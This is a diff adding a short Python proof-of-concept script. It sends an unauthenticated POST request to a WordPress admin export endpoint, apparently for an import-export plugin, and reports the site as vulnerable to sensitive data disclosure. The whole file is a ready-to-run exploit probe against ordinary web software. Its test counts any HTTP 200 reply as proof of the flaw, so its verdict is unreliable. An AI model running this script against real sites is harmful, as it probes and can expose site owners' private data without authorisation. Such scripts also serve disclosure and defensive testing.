@@ -1,0 +1,27 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+
+import requests
+import argparse
+import sys
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-u", "--url", required=True)
+args = parser.parse_args()
+url = args.url.rstrip('/')
+data = {'wpie_download_export_id': '1'}
+
+def poc(url):
+    try:
+        r = requests.post('%s/wp-admin/admin.php?page=wpie-new-export' % url, data=data)
+        if r.status_code == 200:
+            print('[+] %s is vulnerable to unauthenticated sensitive data disclosure' % url)
+        else:
+            print('[-] Not vulnerable')
+    except Exception as e:
+        print('[-] An error ocurred')
+        print('[-] %s' % e)
+    exit()
+
+if __name__ == '__main__':
+    poc(url)
